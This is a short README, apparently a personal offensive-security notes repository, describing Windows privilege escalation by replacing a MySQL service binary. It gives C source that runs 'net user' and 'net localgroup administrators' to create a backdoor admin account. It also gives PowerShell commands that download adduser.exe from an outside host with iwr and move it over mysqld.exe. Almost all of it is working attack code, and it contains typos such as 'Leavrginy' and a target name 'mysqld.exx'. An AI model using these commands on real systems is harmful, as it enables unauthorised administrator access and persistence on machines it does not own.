# Scripts_Windows


## Add user to the system via Leavrginy mysql service. 
Indicator:
![image](https://github.com/MalekAlthubiany/Scripts_Windows/assets/127455300/6ce3ca29-2b07-48a9-a59e-e4df5648a6c5)
```
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user dave2 password123! /add");
  i = system ("net localgroup administrators dave2 /add");
  
  return 0;
}
```
## Simply replace the service
```
PS C:\Users\dave> iwr -uri http://192.168.119.3/adduser.exe -Outfile adduser.exe  

PS C:\Users\dave> move C:\xampp\mysql\bin\mysqld.exe mysqld.exe

PS C:\Users\dave> move .\adduser.exe C:\xampp\mysql\bin\mysqld.exx
```
